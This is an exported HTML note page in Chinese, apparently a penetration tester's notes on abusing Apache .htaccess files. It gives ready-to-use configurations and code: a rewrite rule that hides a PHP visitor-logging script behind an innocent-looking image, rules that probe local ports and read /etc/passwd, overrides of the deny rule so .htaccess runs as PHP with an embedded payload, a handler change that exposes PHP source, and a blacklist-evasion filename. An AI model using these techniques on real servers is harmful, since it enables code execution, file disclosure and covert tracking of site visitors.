<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>htaccess利用</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>htaccess利用</h1><br/>一个基于Apache的Web服务器使用的配置文件，用于控制它所在的目录以及该目录下的所有子目录<br /><br />下面是一个htaccess文件的例子：<br /><br />    Options +FollowSymlinks<br /><br />    RewriteEngine on<br /><br />    RewriteRule lol.jpg /path/to/evil.php [NC]<br /><br />表示查看lol.jpg文件时汇重定向到evil.php<br />我们可以让PHP脚本输出一个图像，之后运行任何恶意代码<br />    &lt;?php<br /><br />    $log = &#39;log.htm&#39;;<br /><br />    $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];<br /><br />    $page = $_SERVER[&#39;REQUEST_URI&#39;];<br /><br />    $refer = $_SERVER[&#39;HTTP_REFERER&#39;];<br /><br />    $date_time = date(&quot;l j F Y  g:ia&quot;, time() - date(&quot;Z&quot;)) ;<br /><br />    $agent = $_SERVER[&#39;HTTP_USER_AGENT&#39;];<br /><br />    $fp = fopen(&quot;log.htm&quot;, &quot;a&quot;);<br /><br />        fputs($fp, &quot;&lt;b&gt;$date_time&lt;/b&gt;&lt;br&gt;<br /><br />                    &lt;b&gt;IP: &lt;/b&gt;$ip&lt;br&gt;<br /><br />                    &lt;b&gt;Page: &lt;/b&gt;$page&lt;br&gt;<br /><br />                    &lt;b&gt;Refer: &lt;/b&gt;$refer&lt;br&gt;<br /><br />                    &lt;b&gt;Useragent:&lt;/b&gt;$agent &lt;br&gt;&lt;br&gt;&quot;);<br /><br />        flock($fp, 3);<br /><br />        fclose($fp);		//↑恶意代码<br /><br />        $my_img = imagecreate( 200, 80 );//↓生成图片给需要的服务<br /><br />        $background = imagecolorallocate( $my_img, 255, 0, 255 );<br /><br />        $text_colour = imagecolorallocate( $my_img, 200, 200, 0 );<br /><br />        $line_colour = imagecolorallocate( $my_img, 128, 255, 0 );<br /><br />     <br /><br />        imagestring( $my_img, 4, 30, 25, &quot;Totally an innocent image&quot;, $text_colour );<br /><br />        imagesetthickness ( $my_img, 5 );<br /><br />        imageline( $my_img, 30, 45, 165, 45, $line_colour );<br /><br />        header( &quot;Content-type: image/png&quot; );<br /><br />        imagepng( $my_img );<br /><br />        imagecolordeallocate( $line_color );<br /><br />        imagecolordeallocate( $text_color );<br /><br />        imagecolordeallocate( $background );<br /><br />        imagedestroy( $my_img );<br /><br />    ?&gt;<br /><br /><br /><br />端口嗅探<br /><br /><br />    Options +FollowSymlinks<br /><br />    RewriteEngine on<br /><br />    RewriteRule lol.jpg <a href="http://127.0.0.1:3306">http://127.0.0.1:3306</a> [NC]<br /><br />或读取本地文件：<br /><br />    Options +FollowSymlinks<br /><br />    RewriteEngine on<br /><br />    RewriteRule lol.jpg file:/etc/passwd [NC]<br /><br /><br /><br />重写了网站的原始htaccess文件并禁用了默认的拒绝规则<br />    &lt;Files ~ “^\.ht”&gt;<br /><br />    # overriding deny rule<br /><br />    # making htaccess accessible from the internet<br /><br />     Require all granted<br /><br />     Order allow,deny<br /><br />     Allow from all<br /><br />    &lt;/Files&gt;<br /><br />一旦攻击者重写了网站的原始htaccess文件并禁用了默认的拒绝规则，他们就可以通过将以下行添加到自定义的htaccess文件来执行远程命令：<br /><br />    AddType application/x-httpd-php .htaccess<br /><br /><br />这将使服务器将htaccess文件视为PHP脚本，并与上述方法配合，以覆盖易受攻击的服务器原始htaccess文件，然后攻击者可以导航到存储htaccess文件的URL，以便执行 PHP代码。 攻击者制作的有效载荷将以htaccess文件中的注释形式出现，例如：<br /><br />    AddType application/x-httpd-php .htaccess<br /><br />    # &lt;?php echo “get pwned”; ?&gt;<br /><br /><br />更改服务器端脚本的内容类型，从而允许攻击者读取PHP文件的源代码<br />    &lt;FilesMatch “\.ph.*$”&gt;<br /><br />     SetHandler text/plain<br /><br />     AddType text/plain .php<br /><br />    &lt;/FilesMatch&gt;<br /><br /><br />当然，这不仅限于PHP。你可以使用相同的方法来生成一个JSP脚本文件或类似的东西（全部取决于在服务器上运行的是哪种技术） - 为了做到这一点，我们需要改变AddType的值以符合所希望的代码执行。<br /><br /><br />规避基于黑名单的过滤器上传一个名为“HTACCE~1”的文件<p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>